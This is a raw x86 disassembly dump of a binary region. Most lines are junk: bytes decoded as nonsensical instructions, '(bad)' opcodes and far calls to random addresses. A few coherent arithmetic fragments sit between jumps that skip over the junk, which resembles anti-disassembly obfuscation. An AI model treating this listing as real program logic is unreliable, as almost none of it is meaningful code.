  409064:	pushf  
  409065:	mov    bh,BYTE PTR [esp+ebp*2-0x27]
  409069:	adc    BYTE PTR [edi+0x6a],bh
  40906c:	mov    ah,BYTE PTR [esi]
  40906e:	adc    al,0xf1
  409070:	and    bh,BYTE PTR [esi]
  409072:	int3   
  409073:	cmc    
  409074:	test   BYTE PTR [eax+0x44],0x1
  409078:	out    0x89,al
  40907a:	sbb    DWORD PTR [edi-0x29],ecx
  40907d:	dec    ebx
  40907e:	jp     0x409068
  409080:	mov    cl,0xf6
  409082:	mov    dl,0x39
  409084:	add    DWORD PTR [ebx+0x763e7bc3],ebp
  40908a:	retf   0x1a67
  40908d:	jo     0x40910c
  40908f:	(bad)  
  409090:	outs   dx,DWORD PTR ds:[esi]
  409091:	mov    al,0xb5
  409093:	mov    ds:0xa3f165e3,al
  409098:	pop    eax
  409099:	mov    dl,0xcf
  40909b:	pop    esi
  40909c:	sub    BYTE PTR [ecx+0x1a],0xa4
  4090a0:	push   ebp
  4090a1:	cmp    esp,DWORD PTR [ebp-0x50]
  4090a4:	aaa    
  4090a5:	sahf   
  4090a6:	xlat   BYTE PTR ds:[ebx]
  4090a7:	push   esp
  4090a8:	fwait
  4090a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090aa:	add    ebp,DWORD PTR [ecx+esi*1]
  4090ad:	dec    edi
  4090ae:	sub    cl,0xe7
  4090b1:	into   
  4090b2:	add    edx,DWORD PTR [edx+eax*1]
  4090b5:	mov    ah,0x29
  4090b7:	mov    ecx,0xe9ba438f
  4090bc:	cmp    BYTE PTR [edx-0xe],bh
  4090bf:	dec    edi
  4090c0:	addr16 push esp
  4090c2:	test   al,0x26
  4090c4:	(bad)  
  4090c7:	add    DWORD PTR [esp+ecx*8+0x7c800022],edi
  4090ce:	lods   al,BYTE PTR ds:[esi]
  4090cf:	and    eax,0xc7f03beb
  4090d4:	add    eax,0x42a821
  4090d9:	jne    0x409156
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x91a4c6c4
  4090f5:	or     eax,0xef8e4ee7
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x409173
  409101:	sbb    ch,BYTE PTR [edi]
  409103:	sub    DWORD PTR [esi+0x51],0x61
  409107:	adc    esp,edx
  409109:	(bad)  
  40910a:	gs xchg esi,eax
  40910c:	jecxz  0x409154
  40910e:	xlat   BYTE PTR ds:[ebx]
  40910f:	int    0x86
  409111:	dec    ebp
  409112:	cmp    bh,ah
  409114:	push   esp
  409115:	xor    BYTE PTR [edx+0x27],cl
  409118:	push   0x52
  40911a:	rol    DWORD PTR [edi+eiz*8],1
  40911d:	push   es
  40911e:	inc    ebp
  40911f:	loop   0x40912b
  409121:	cmp    al,0xb5
  409123:	jmp    0xf2e0:0x5f2f3544
  40912a:	les    ebx,FWORD PTR [ebx]
  40912c:	xor    al,0xf7
  40912e:	dec    esp
  40912f:	retf   0x18df
  409132:	in     eax,0x24
  409134:	jae    0x40916e
  409136:	cmp    ch,BYTE PTR [ebx-0x2371d1f0]
  40913c:	call   0x8da79f48
  409141:	or     eax,0x56bea4e9
  409146:	repnz push ds
  409148:	xchg   BYTE PTR [ebx],ah
  40914a:	pop    ebp
  40914b:	inc    esp
  40914c:	fmul   QWORD PTR [edi+0x6406771f]
  409152:	cld    
  409153:	sbb    al,0x34
  409155:	add    DWORD PTR [edi],ecx
  409157:	and    eax,0x72cc852
  40915c:	dec    ebp
  40915d:	fbld   TBYTE PTR [edx-0x48dc87d1]
  409163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409164:	in     eax,0x98
  409166:	and    al,BYTE PTR [eax-0x1d4b74cf]
  40916c:	cld    
  40916d:	idiv   BYTE PTR [edx+0x56da556d]
  409173:	dec    ebx
  409174:	inc    eax
  409175:	gs add al,0x7e
  409178:	mov    ebx,0xc23aa7c2
  40917d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40917e:	push   ss
  40917f:	dec    eax
  409180:	mov    eax,ds:0x5c141c3b
  409185:	mov    DWORD PTR [esi+0x660d4bfe],ebx
  40918b:	jb     0x4091a0
  40918d:	push   ebp
  40918e:	dec    esp
  40918f:	adc    BYTE PTR [ebx-0x7c],ch
  409192:	pop    eax
  409193:	in     al,dx
  409194:	jb     0x409160
  409196:	out    0x70,al
  409198:	adc    dl,BYTE PTR [ebx*2+0x2f29111b]
  40919f:	fcomp  st(7)
  4091a1:	dec    edx
  4091a2:	aaa    
  4091a3:	cdq    
  4091a4:	cld    
  4091a5:	sbb    eax,0x1bbad94
  4091aa:	dec    eax
  4091ab:	js     0x409144
  4091ad:	dec    eax
  4091ae:	(bad)  
  4091af:	or     BYTE PTR [edx-0x20],0x1b
  4091b3:	push   edi
  4091b4:	push   ecx
  4091b5:	lea    ebp,[esi]
  4091b7:	inc    edx
  4091b8:	pop    eax
  4091b9:	adc    eax,0xe5b30c64
  4091be:	jne    0x409168
  4091c0:	add    DWORD PTR [edi-0x53],esi
  4091c3:	sub    DWORD PTR [edx],ebp
  4091c5:	lods   eax,DWORD PTR ds:[esi]
  4091c6:	pop    ss
  4091c7:	aas    
  4091c8:	inc    eax
  4091c9:	in     eax,dx
  4091ca:	xor    DWORD PTR [edi+0x17],edi
  4091cd:	daa    
  4091ce:	add    edi,DWORD PTR [ecx]
  4091d0:	lock push edx
  4091d2:	nop
  4091d3:	mov    dl,0x14
  4091d5:	jnp    0x409255
  4091d7:	shl    DWORD PTR [eax+ebx*8],0x1
  4091db:	jge    0x4091da
  4091dd:	fisttp WORD PTR [edi]
  4091df:	adc    esp,DWORD PTR [eax]
  4091e1:	adc    cl,bl
  4091e3:	mov    bl,0xc7
  4091e5:	xor    eax,0x70792f03
  4091ea:	cmp    dl,BYTE PTR [esi+edx*8+0x6eecc1ea]
  4091f1:	imul   ebp,DWORD PTR [ecx+esi*4-0x51],0x168c1885
  4091f9:	or     ebp,DWORD PTR [esi+ebx*4+0x63e6b6c5]
  409200:	daa    
  409201:	xor    al,0xe6
  409203:	pusha  
  409204:	inc    esp
  409205:	add    edx,DWORD PTR [ecx]
  409207:	add    eax,0xc1ed9c08
  40920c:	pusha  
  40920d:	popa   
  40920e:	mov    WORD PTR [ecx],?
  409210:	adc    BYTE PTR [ebx+0x1617787b],0xe5
  409217:	shl    BYTE PTR [esp+ecx*1-0x4f8b9f13],cl
  40921e:	dec    edi
  40921f:	loopne 0x4091e4
  409221:	sti    
  409222:	(bad)  
  409223:	mov    al,0xbe
  409225:	xchg   ecx,eax
  409226:	inc    edi
  409227:	jg     0x4091af
  409229:	push   0x66f1f067
  40922e:	inc    eax
  40922f:	loop   0x409270
  409231:	int3   
  409232:	pop    esi
  409233:	mov    ds:0xbdbe6afe,al
  409238:	xchg   esi,eax
  409239:	inc    ebp
  40923a:	ror    BYTE PTR [esi+0x5fc569c3],0xca
  409241:	sub    eax,0x1f833fca
  409246:	mov    dl,0xac
  409248:	inc    esi
  409249:	pop    eax
  40924a:	out    dx,eax
  40924b:	repnz test al,0x18
  40924e:	repz hlt 
  409250:	pop    ds
  409251:	ss jle 0x409253
  409254:	adc    al,0xda
  409256:	retf   0xa6f
  409259:	pop    ds
  40925a:	adc    cl,BYTE PTR [esi]
  40925c:	inc    ecx
  40925d:	push   ebp
  40925e:	pop    eax
  40925f:	xchg   ebp,eax
  409260:	xchg   edx,eax
  409261:	push   eax
  409262:	test   BYTE PTR [eax+0x69],0x62
  409266:	mov    esi,0x48861b7e
  40926b:	push   0x83f42eaf
  409270:	mov    ds:0xcba620b7,eax
  409275:	repnz and eax,DWORD PTR ds:0xda08ac7c
  40927c:	into   
  40927d:	aam    0x48
  40927f:	and    al,0xcd
  409281:	push   eax
  409282:	push   0x5b4b11b7
  409287:	xor    DWORD PTR [ebp+0x57e87c34],ecx
  40928d:	xchg   ecx,eax
  40928e:	push   0xf
  409290:	ror    bh,cl
  409292:	add    BYTE PTR [edi],al
  409294:	push   es
  409295:	add    DWORD PTR fs:[esi-0x3b7b368a],0x5bbacaa6
  4092a0:	mov    dh,0xf0
  4092a2:	push   ebx
  4092a3:	push   0xffffffe3
  4092a5:	loope  0x409292
  4092a7:	pop    ecx
  4092a8:	lahf   
  4092a9:	push   ds
  4092aa:	sbb    eax,0x24ed47ae
  4092af:	lea    edx,[eax+0x34687f3]
  4092b5:	mov    DWORD PTR [esp+edx*8],edi
  4092b8:	inc    ebp
  4092b9:	jle    0x409331
  4092bb:	jge    0x4092cf
  4092bd:	sub    eax,0x691582e8
  4092c2:	ret    
  4092c3:	jl     0x409279
  4092c5:	jne    0x40931c
  4092c7:	push   esp
  4092c8:	fidiv  WORD PTR [eax-0x7ab18cb7]
  4092ce:	sub    BYTE PTR [esi],ch
  4092d0:	mov    edi,?
  4092d2:	mov    eax,ds:0xd9d73c3f
  4092d7:	int    0x18
  4092d9:	dec    esi
  4092da:	retf   
  4092db:	sbb    ebx,edx
  4092dd:	lods   al,BYTE PTR ds:[esi]
  4092de:	xor    BYTE PTR [edx],al
  4092e0:	push   esi
  4092e1:	pop    ebx
  4092e2:	push   edx
  4092e3:	test   eax,0xb2c774b7
  4092e8:	cld    
  4092e9:	mov    al,al
  4092eb:	aad    0xb6
  4092ed:	in     eax,dx
  4092ee:	push   0xb
  4092f0:	xchg   esi,eax
  4092f1:	fwait
  4092f2:	cs add al,0xf0
  4092f5:	xor    edi,ecx
  4092f7:	xchg   ebp,eax
  4092f8:	mov    ecx,0xd7ff19cc
  4092fd:	add    ebx,DWORD PTR ss:[ebp-0x51d6afde]
  409304:	inc    edi
  409305:	ret    0x1346
  409308:	sub    eax,0xb3f14f64
  40930d:	je     0x4092d2
  40930f:	(bad)  
  409310:	outs   dx,BYTE PTR ds:[esi]
  409311:	loop   0x409331
  409313:	pushf  
  409314:	adc    ebx,ebp
  409316:	sbb    BYTE PTR [edx],al
  409318:	jne    0x40936c
  40931a:	sub    ecx,ecx
  40931c:	into   
  40931d:	sbb    edi,esi
  40931f:	mov    WORD PTR [ecx+0x7abc052],cs
  409325:	pusha  
  409326:	mov    al,0xc2
  409328:	jmp    0x4092e5
  40932a:	clc    
  40932b:	xchg   ecx,eax
  40932c:	push   cs
  40932d:	fpatan 
  40932f:	aas    
  409330:	mov    dh,0xa5
  409332:	push   ss
  409333:	adc    eax,0x76a481b9
  409338:	rcl    DWORD PTR [ebx],0x93
  40933b:	cld    
  40933c:	fld    QWORD PTR [edx-0x3eb7a3a1]
  409342:	sbb    ebp,DWORD PTR [ebx+0xe]
  409345:	out    0x4b,eax
  409347:	xchg   ebx,eax
  409348:	sbb    eax,0x76ac8c6b
  40934d:	add    dh,ch
  40934f:	ror    DWORD PTR [esi+0x71],0x82
  409353:	pushf  
  409354:	and    bl,BYTE PTR [edx+0x2da9794a]
  40935a:	mov    ch,0xc0
  40935c:	outs   dx,DWORD PTR ds:[esi]
  40935d:	xchg   BYTE PTR ds:0x1426595a,dl
  409363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409364:	ret    
  409365:	inc    edx
  409366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409367:	data16 arpl WORD PTR [ecx-0x8d6dace],sp
  40936e:	in     eax,dx
  40936f:	(bad)  
  409373:	jmp    0xa687dd7
  409378:	pop    edi
  409379:	call   0xa22d:0x503bb6af
  409380:	dec    edx
  409381:	mov    edx,0x3f708476
  409386:	mov    esi,0x8fc6297
  40938b:	cmp    BYTE PTR [ebx-0x316916fa],dh
  409391:	jecxz  0x409317
  409393:	or     BYTE PTR [edi],cl
  409395:	or     eax,0xea784b4a
  40939a:	leave  
  40939b:	neg    DWORD PTR [ecx]
  40939d:	cmc    
  40939e:	xlat   BYTE PTR ds:[ebx]
  40939f:	mov    al,0xcb
  4093a1:	nop
  4093a2:	jl     0x409408
  4093a4:	scas   eax,DWORD PTR es:[edi]
  4093a5:	ja     0x4093b5
  4093a7:	fdivr  DWORD PTR [esi-0x7e03ba75]
  4093ad:	add    eax,0x42a7d9
  4093b2:	mov    DWORD PTR [edi+0x758b0042],esp
  4093b8:	clc    
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xb355ff3d
  4093fb:	sbb    DWORD PTR [edx+0x35],edi
  4093fe:	in     al,dx
  4093ff:	js     0x409479
  409401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409402:	jle    0x40947c
  409404:	js     0x409443
  409406:	cdq    
  409407:	xchg   esi,eax
  409408:	push   ebx
  409409:	mov    ds:0x2ac66629,al
  40940e:	mov    ?,WORD PTR [ecx+0x17]
  409411:	imul   ebp,DWORD PTR [edi],0x52
  409414:	into   
  409415:	mov    eax,0x93be0af7
  40941a:	je     0x4093b5
  40941c:	or     al,0xf1
  40941e:	test   DWORD PTR [ebp-0x4a],edi
  409421:	es inc esi
  409423:	pop    ebp
  409424:	std    
  409425:	outs   dx,DWORD PTR ds:[esi]
  409426:	mov    al,0x8c
  409428:	mov    sp,0xa4ed
  40942c:	retf   
  40942d:	gs (bad) 
  409430:	call   0xd9b4eb12
  409435:	pop    ebp
  409436:	mov    WORD PTR ds:0x3acaf6a0,ss
  40943c:	hlt    
  40943d:	fnsave [ebx+0x6740b373]
  409443:	jmp    0xb5c4:0x7d3ff7cb
  40944a:	fidivr DWORD PTR [ebx+0x7c9d67a6]
  409450:	test   BYTE PTR [ecx],cl
  409452:	stos   BYTE PTR es:[edi],al
  409453:	es popf 
  409455:	or     eax,0x790453b5
  40945a:	mov    ecx,DWORD PTR [esi-0x3]
  40945d:	gs (bad) 
  40945f:	jge    0x409490
  409461:	sub    DWORD PTR [ecx+0x58],ecx
  409464:	mul    BYTE PTR [eax]
  409466:	ficomp WORD PTR [ebx-0x7b0f2f54]
  40946c:	push   ds
  40946d:	cmc    
  40946e:	mov    eax,ds:0x78f437fd
  409473:	mov    bl,ch
  409475:	adc    edi,DWORD PTR [edi-0x52]
  409478:	xor    eax,0x73250669
  40947d:	xchg   esp,esi
  40947f:	fadd   DWORD PTR [edx]
  409481:	dec    esi
  409482:	adc    eax,0x666959e5
  409487:	icebp  
  409488:	push   esi
  409489:	icebp  
  40948a:	outs   dx,BYTE PTR ds:[esi]
  40948b:	adc    DWORD PTR [ebp+ecx*4-0x9544b95],ebp
  409492:	dec    edx
  409493:	pop    esp
  409494:	cmp    al,BYTE PTR [edx-0x20]
  409497:	and    al,0x2b
  409499:	or     eax,0xd2858263
  40949e:	out    dx,al
  40949f:	test   ebx,0x52638d0e
  4094a5:	mov    ds:0x37b977df,eax
  4094aa:	ds dec esp
  4094ac:	or     edi,ebx
  4094ae:	push   ebx
  4094af:	and    al,0x1d
  4094b1:	dec    ebp
  4094b2:	les    eax,FWORD PTR [edi+0x27]
  4094b5:	scas   al,BYTE PTR es:[edi]
  4094b6:	dec    ebp
  4094b7:	inc    esi
  4094b8:	mov    ecx,0x9842ba9f
  4094bd:	jbe    0x409493
  4094bf:	sub    BYTE PTR [eax],dl
  4094c1:	fsub   DWORD PTR ds:0x643d4f31
  4094c7:	dec    edi
  4094c8:	or     ebp,edx
  4094ca:	outs   dx,DWORD PTR ds:[esi]
  4094cb:	jl     0x40954a
  4094cd:	lods   al,BYTE PTR ds:[esi]
  4094ce:	test   esi,ecx
  4094d0:	mov    ds:0xd311cbe6,eax
  4094d5:	retf   0xa438
  4094d8:	out    0x78,al
  4094da:	jge    0x4094ea
  4094dc:	retf   
  4094dd:	dec    esp
  4094de:	rol    DWORD PTR ds:0x84add9d8,0x7e
  4094e5:	cs jns 0x409533
  4094e8:	sub    dh,ch
  4094ea:	mov    dh,0x4a
  4094ec:	cdq    
  4094ed:	pop    ebp
  4094ee:	push   edi
  4094ef:	repz test BYTE PTR [eax+0x31],ch
  4094f3:	imul   eax,eax,0xffffff87
  4094f6:	jle    0x4094a1
  4094f8:	ins    BYTE PTR es:[edi],dx
  4094f9:	jnp    0x4094e0
  4094fb:	dec    ecx
  4094fc:	scas   eax,DWORD PTR es:[edi]
  4094fd:	push   ebx
  4094fe:	loope  0x4094ad
  409500:	fadd   DWORD PTR [edi+0x4c213441]
  409506:	and    cl,ah
  409508:	dec    esi
  409509:	sub    eax,0x947525e2
  40950e:	push   esi
  40950f:	push   0xb09c928f
  409514:	push   eax
  409515:	jle    0x409562
  409517:	add    al,BYTE PTR es:[edi]
  40951a:	mov    cl,0xe9
  40951c:	out    0xe1,eax
  40951e:	cli    
  40951f:	and    BYTE PTR [edx+0x6e],al
  409522:	mov    dl,0xec
  409524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409525:	pop    ecx
  409526:	sbb    bh,BYTE PTR ds:0x55f23f31
  40952c:	dec    ecx
  40952d:	push   ebp
  40952e:	xor    eax,0xf763a615
  409533:	push   0x539192ae
  409538:	adc    DWORD PTR [edi-0x35],eax
  40953b:	sbb    ch,BYTE PTR [esi-0x1c]
  40953e:	add    ah,bl
  409540:	iret   
  409541:	or     dl,ah
  409543:	sub    eax,0xf951a01b
  409548:	pop    ecx
  409549:	xchg   ebp,eax
  40954a:	aam    0x40
  40954c:	cmp    dh,BYTE PTR [ecx+0x2d]
  40954f:	test   DWORD PTR [edx-0x29],esi
  409552:	push   esi
  409553:	cmc    
  409554:	fldenv [edx+eax*8]
  409557:	mov    dh,0x9e
  409559:	xchg   ebp,eax
  40955a:	push   ebp
  40955b:	xchg   ecx,eax
  40955c:	push   0x1977a48e
  409561:	mov    edx,0x1b49a944
  409566:	nop
  409567:	(bad)
  40956b:	fcmovne st,st(7)
  40956d:	cld    
  40956e:	enter  0x3b84,0x2c
  409572:	jmp    0x4094f7
  409574:	inc    eax
  409575:	add    cl,bl
  409577:	sbb    eax,0xba9b791
  40957c:	test   eax,0x79df880e
  409581:	cmp    al,0x71
  409583:	popa   
  409584:	dec    esp
  409585:	sbb    DWORD PTR [edi+0x1a51db97],edi
  40958b:	push   ebp
  40958c:	mov    DWORD PTR [esp+edi*2+0x6755b8ed],ebx
  409593:	jecxz  0x409575
  409595:	sbb    BYTE PTR [esi],bh
  409597:	fldcw  WORD PTR [ebx]
  409599:	xchg   ebp,eax
  40959a:	mov    DWORD PTR [eax-0x49],ecx
  40959d:	adc    dl,dh
  40959f:	inc    esi
  4095a0:	mov    esi,DWORD PTR [edx-0x554f108]
  4095a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095a7:	adc    al,0x46
  4095a9:	ins    BYTE PTR es:[edi],dx
  4095aa:	stos   DWORD PTR es:[edi],eax
  4095ab:	call   0xb69e:0x45120a15
  4095b2:	outs   dx,BYTE PTR ds:[esi]
  4095b3:	lods   al,BYTE PTR ds:[esi]
  4095b4:	add    al,0xf4
  4095b6:	data16 fld QWORD PTR [ecx+0x36c605ce]
  4095bd:	fst    QWORD PTR [ebp+0x5f]
  4095c0:	adc    DWORD PTR [edi+ebp*4+0x1c],ebx
  4095c4:	shl    DWORD PTR [edi+ebx*2],1
  4095c7:	mov    ebp,0x9ed94808
  4095cc:	js     0x409557
  4095ce:	lock adc eax,esp
  4095d1:	jne    0x40963c
  4095d3:	aam    0x76
  4095d5:	fs sbb dh,ah
  4095d8:	mov    esp,0xa4db5396
  4095dd:	scas   al,BYTE PTR es:[edi]
  4095de:	inc    esi
  4095df:	mov    ch,0xbb
  4095e1:	inc    esp
  4095e2:	out    dx,eax
  4095e3:	xchg   edx,eax
  4095e4:	add    ebx,DWORD PTR [eax]
  4095e6:	mov    ds:0x863b7d65,eax
  4095eb:	mov    DWORD PTR [ebx*4-0x2b98b7a1],edi
  4095f2:	scas   eax,DWORD PTR es:[edi]
  4095f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f4:	call   DWORD PTR [edi+0x4b81183]
  4095fa:	lock xchg BYTE PTR [esi+0x4f],bh
  4095fe:	sub    eax,0x91f41bc7
  409603:	imul   ebx,DWORD PTR [esi+eiz*2+0x1],0x646200ba
  40960b:	test   DWORD PTR [ecx],esi
  40960d:	pop    esp
  40960e:	push   es
  40960f:	mov    cl,0x88
  409611:	add    eax,0xa0ff4689
  409616:	in     al,0x4f
  409618:	icebp  
  409619:	es adc ebx,eax
  40961c:	pusha  
  40961d:	adc    cl,ah
  40961f:	sbb    DWORD PTR [eax+eax*1],ebx
  409622:	in     eax,dx
  409623:	sub    eax,0xccb17f2a
  409628:	jp     0x409630
  40962a:	mov    eax,ds:0x5d417bbb
  40962f:	clc    
  409630:	stc    
  409631:	mov    DWORD PTR [ecx+0x59d6fa2e],ebp
  409637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409638:	lock jbe 0x4095db
  40963b:	xchg   esi,eax
  40963c:	inc    esp
  40963d:	add    eax,0x6c8681ec
  409642:	ret    0xec96
  409645:	sti    
  409646:	add    cl,cl
  409648:	inc    esp
  409649:	lods   al,BYTE PTR ds:[esi]
  40964a:	daa    
  40964b:	inc    eax
  40964c:	ret    
  40964d:	ror    BYTE PTR [edx],cl
  40964f:	mov    bl,0x28
  409651:	push   esp
  409652:	push   ebp
  409653:	mov    ds:0x9d1d95ba,eax
  409658:	in     eax,0x85
  40965a:	xchg   esi,eax
  40965b:	das    
  40965c:	mov    edx,0x662bc1b5
  409661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409662:	popa   
  409663:	jmp    0x4096c9
  409665:	std    
  409666:	mov    eax,ds:0xeda955e6
  40966b:	sub    esp,ebx
  40966d:	or     eax,0xfd53b128
  409672:	aam    0x43
  409674:	add    ecx,DWORD PTR [ebx+eiz*8-0x56]
  409678:	fsub   st(2),st
  40967a:	scas   eax,DWORD PTR es:[edi]
  40967b:	mov    eax,0x6ff75421
  409680:	call   0x819a:0x9e9b9ceb
  409687:	shl    BYTE PTR [esi+0x1c],1
  40968a:	enter  0x77e2,0x9e
  40968e:	or     BYTE PTR [ebp+edi*4-0x11],ah
  409692:	add    eax,0x1f704045
  409697:	sbb    ch,ah
  409699:	jno    0x4096c0
  40969b:	push   esp
  40969c:	popf   
  40969d:	neg    DWORD PTR [ebx-0x37]
  4096a0:	jae    0x409677
  4096a2:	add    dh,cl
  4096a4:	test   DWORD PTR [edx+ebp*2-0x1f775f6b],edx
  4096ab:	hlt    
  4096ac:	xchg   esp,eax
  4096ad:	out    dx,al
  4096ae:	mov    eax,DWORD PTR [ebp-0x4]
  4096b1:	je     0x4093ac
  4096b7:	xor    eax,edx
  4096b9:	add    eax,ecx
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x99
  4096e4:	cdq    
  4096e5:	or     edx,DWORD PTR [esp+ebx*2-0xe]
  4096e9:	js     0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x40974c
  4096f0:	adc    BYTE PTR [edi-0x2e9bdf98],0x87
  4096f7:	xor    eax,0x62f8b9bc
  4096fc:	inc    edi
  4096fd:	mov    esi,0x37e1cb40
  409702:	out    0xe2,eax
  409704:	sbb    dh,bh
  409706:	hlt    
  409707:	push   0x42327cb
  40970c:	inc    edx
  40970d:	fmul   DWORD PTR [esi-0x1a380f55]
  409713:	repnz mov al,0xf4
  409716:	icebp  
  409717:	push   es
  409718:	mov    edx,0x73467166
  40971d:	pushf  
  40971e:	adc    al,al
  409720:	push   eax
  409721:	sub    eax,0x4c6bbf1
  409726:	and    al,BYTE PTR [eax+0x7f597d70]
  40972c:	mov    ecx,0x890c1adb
  409731:	cli    
  409732:	mov    ebp,0x1600dcca
  409737:	loope  0x40970d
  409739:	or     DWORD PTR [eax+0x631f1de2],0x55da9b8d
  409743:	pop    edi
  409744:	dec    ebp
  409745:	shl    DWORD PTR ds:0x976fb27d,1
  40974b:	test   al,0x21
  40974d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40974e:	jae    0x409765
  409750:	(bad)  
  409751:	pop    esp
  409752:	ret    0x25b2
  409755:	sahf   
  409756:	add    DWORD PTR [ebp+0x6b34d4b8],esi
  40975c:	xchg   ebp,eax
  40975d:	popf   
  40975e:	and    cl,dh
  409760:	pushf  
  409761:	adc    ebx,DWORD PTR [esi-0x41b30f19]
  409767:	jge    0x4096ee
  409769:	xor    ecx,edi
  40976b:	std    
  40976c:	inc    ecx
  40976d:	mov    bl,BYTE PTR [ebp-0x2d]
  409770:	loop   0x4097d4
  409772:	les    edi,FWORD PTR [ecx+0x4f]
  409775:	in     al,dx
  409776:	ret    
  409777:	mov    ebp,0x56c1219a
  40977c:	xor    bh,BYTE PTR [ecx]
  40977e:	xlat   BYTE PTR ds:[ebx]
  40977f:	xchg   edi,eax
  409780:	sub    ebx,eax
  409782:	fnstcw WORD PTR [ebp+0x7afb495]
  409788:	cmp    dh,BYTE PTR [ebp+0x2885342c]
  40978e:	pop    eax
  40978f:	sahf   
  409790:	sbb    ah,al
  409792:	push   cs
  409793:	lea    esi,[ebx-0x5d0ed51]
  409799:	mov    bl,0xe6
  40979b:	or     eax,DWORD PTR [ebp-0x54dd5c35]
  4097a1:	push   ss
  4097a2:	mov    ebx,0x61dac16d
  4097a7:	mov    DWORD PTR [ebp-0x14973dbe],edi
  4097ad:	mov    esp,DWORD PTR [edx]
  4097af:	lods   eax,DWORD PTR ds:[esi]
  4097b0:	xchg   edi,eax
  4097b1:	xchg   esp,eax
  4097b2:	pusha  
  4097b3:	cmp    al,0x32
  4097b5:	push   0x1ad8cd2f
  4097ba:	int3   
  4097bb:	imul   ecx,DWORD PTR [eax],0x33cea148
  4097c1:	into   
  4097c2:	mov    ecx,0x498efda6
  4097c7:	fimul  DWORD PTR [edi-0x3d72e1d2]
  4097cd:	fadd   QWORD PTR [edi+0x1ed2cff3]
  4097d3:	es test dl,bl
  4097d6:	test   al,0x62
  4097d8:	adc    eax,0xe1e4e3a7
  4097dd:	into   
  4097de:	mov    cl,cl
  4097e0:	xchg   BYTE PTR [ebx],dl
  4097e2:	out    0x9,al
  4097e4:	pop    ss
  4097e5:	test   bl,dl
  4097e7:	xor    esi,0xd926e59
  4097ed:	imul   ebx,DWORD PTR [ebp-0x6b],0x1282e36d
  4097f4:	fmulp  st(1),st
  4097f6:	mov    edi,0x3bbee6dd
  4097fb:	bound  ebp,QWORD PTR ds:0x29df3ab9
  409801:	aam    0x11
  409803:	mov    esp,0x4c05a6df
  409808:	cmp    DWORD PTR [esi-0x6ddbf4a8],ebp
  40980e:	sub    al,dl
  409810:	or     al,0x96
  409812:	pop    edx
  409813:	call   0x8b63:0xd90627a1
  40981a:	inc    edi
  40981b:	inc    edx
  40981c:	and    BYTE PTR [edx+0x1c],dh
  40981f:	shr    DWORD PTR [esi-0x2c511359],cl
  409825:	rcl    esp,1
  409827:	jecxz  0x409816
  409829:	add    esp,DWORD PTR [eax]
  40982b:	mov    dh,0xd8
  40982d:	and    eax,0x3d1b3891
  409832:	push   ebp
  409833:	xchg   ecx,eax
  409834:	or     ebp,esi
  409836:	lahf   
  409837:	sahf   
  409838:	jecxz  0x4097f4
  40983a:	jb     0x4097bc
  40983c:	cmp    BYTE PTR [edx-0x25],dl
  40983f:	loopne 0x409894
  409841:	xchg   ebp,eax
  409842:	cli    
  409843:	inc    esp
  409844:	jmp    0x409886
  409846:	popf   
  409847:	xlat   BYTE PTR ds:[ebx]
  409848:	(bad)  
  409849:	aaa    
  40984a:	cld    
  40984b:	mov    eax,ds:0xf37091ec
  409850:	popa   
  409851:	adc    esi,eax
  409853:	push   0xffffffe3
  409855:	fiadd  DWORD PTR [ecx+0x2]
  409858:	jo     0x4097db
  40985a:	pop    edi
  40985b:	das    
  40985c:	ins    DWORD PTR es:[edi],dx
  40985d:	adc    ah,BYTE PTR [ecx+0x1f]
  409860:	sar    BYTE PTR [ebp+0x30],cl
  409863:	push   eax
  409864:	(bad)  
  409865:	arpl   WORD PTR ds:0xeecaabf7,bp
  40986b:	adc    ah,BYTE PTR [eax]
  40986d:	cmp    DWORD PTR [edx],0xb4a115f3
  409873:	push   ecx
  409874:	lods   al,BYTE PTR ds:[esi]
  409875:	ret    0x4563
  409878:	jo     0x4098ca
